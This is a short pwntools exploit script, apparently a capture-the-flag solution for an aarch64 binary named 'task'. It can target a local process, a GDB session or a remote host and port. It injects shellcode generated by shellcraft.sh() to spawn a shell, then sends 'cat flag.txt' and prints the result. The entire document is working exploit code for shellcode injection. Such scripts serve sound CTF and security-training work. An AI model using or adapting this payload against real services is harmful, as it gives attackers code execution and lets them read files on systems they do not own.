#!/usr/bin/env python3

from pwn import *

elf = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"b *vuln+69",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

context.arch = 'aarch64'
p.sendline(asm(shellcraft.sh()))

sleep(1)
p.sendline(b"cat flag.txt")

output = p.clean(1.0)
print(output)
